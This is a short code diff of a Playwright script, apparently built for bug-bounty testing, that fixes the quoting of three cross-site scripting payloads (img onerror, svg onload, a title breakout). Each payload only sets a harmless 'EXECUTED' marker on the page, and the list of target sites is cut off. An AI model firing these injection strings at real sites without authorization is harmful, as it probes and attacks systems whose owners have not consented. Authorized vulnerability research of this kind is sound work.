@@ -2,9 +2,9 @@ import { chromium } from "playwright";
 
 const ua = "amazonvrpresearcher_pradyuman1";
 const payloads = [
-  ""><img src=x onerror=\"document.body.dataset.h1xss='EXECUTED'\">",
-  ""><svg/onload=\"document.body.dataset.h1xss='EXECUTED'\">",
-  "</title><svg/onload=\"document.body.dataset.h1xss='EXECUTED'\">"
+  `"><img src=x onerror="document.body.dataset.h1xss='EXECUTED'">`,
+  `"><svg/onload="document.body.dataset.h1xss='EXECUTED'">`,
+  `</title><svg/onload="document.body.dataset.h1xss='EXECUTED'">`
 ];
 
 const targets = [
